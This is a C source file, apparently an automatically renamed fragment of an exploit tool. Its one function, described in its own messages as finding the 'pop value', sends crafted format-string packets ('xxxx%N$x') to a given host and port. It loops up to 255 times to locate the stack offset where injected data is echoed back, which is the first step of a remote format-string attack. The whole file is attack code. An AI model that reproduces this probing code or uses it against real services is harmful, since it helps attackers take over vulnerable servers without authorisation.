#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int FMTSIZE ; 
 scalar_t__ FUNC0 (int) ; 
 int /*<<< orphan*/  FUNC1 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC2 (char*,int,int) ; 
 int /*<<< orphan*/  FUNC3 (char*,int) ; 
 int /*<<< orphan*/  FUNC4 (char*,...) ; 
 scalar_t__ FUNC5 (char*,unsigned short,char*,int,int) ; 
 int /*<<< orphan*/  FUNC6 (char*,char*,...) ; 
 int /*<<< orphan*/  FUNC7 (char*,char*) ; 
 scalar_t__ FUNC8 (char*) ; 
 int /*<<< orphan*/  FUNC9 (int) ; 

void FUNC10(char *hostname,unsigned short port){
 unsigned int pops=0;
 char orig[4+1];
 char match[8+1];
 char *buf;
 unsigned char *reply; /* for %d of reply[17]. */
 if(!(buf=(char *)FUNC0(FMTSIZE+1)))
  FUNC3("getpops(): allocating memory failed",1);
 FUNC4("NOTE: i did not add the command to disconnec"
 "t the user.\nso, you have to wait roughly a minute "
 "before each user\n(format string placed as a user) "
 "times out.  basically,\nwait a minute in-between us"
 "ing it.  also, the packets may\nor may not come bac"
 "k in order. (or come back at all)\n\n");
 FUNC4("[*] finding pop value: %s:%d.\n\n",hostname,
 port);
 while(pops++<255){
  FUNC2(buf,0x0,(FMTSIZE+1));
  FUNC1(buf,"\x00\x00\x00\x00\x00\x00\x00\x00\x03\x04"
  ,10);
  /* 37=0x25='%' will get processed as a format. */
  if(pops==37)
   FUNC6(buf+10,"xxxx%c%c%%%d$x%cunused%c",pops,
   pops,pops,0x0,0x0);
  else
   FUNC6(buf+10,"xxxx%c%%%d$x%cunused%c",pops,
   pops,0x0,0x0);
  reply=(char *)FUNC5(hostname,port,buf,
  FMTSIZE,1);
  /* proof of packet reply desired. */
  FUNC2(orig,0x0,4+1);
  FUNC6(orig,"%.4s",(reply+13));
  /* want this to be 78787878. (xxxx) */
  FUNC2(match,0x0,8+1);
  FUNC6(match,"%.8s",(reply+18));
  /* make sure its the packet desired. */
  if(FUNC8(match)&&FUNC8(orig)&&
  !FUNC7("xxxx",orig)){
   if(!FUNC7("78787878",match)){
    FUNC4("%d:\t(true)\t%s\n",reply[17],match);
    FUNC4("\n[*] the pop value is: %d.\n",pops);
    return;
   }
   else
    FUNC4("%d:\t(false)\t%s\n",reply[17],
    FUNC8(match)?match:"(no data)");
  }
  FUNC9(100000); /* pace it. */
 }
 FUNC4("\n[!] pop location find failed.\n");
 return;
}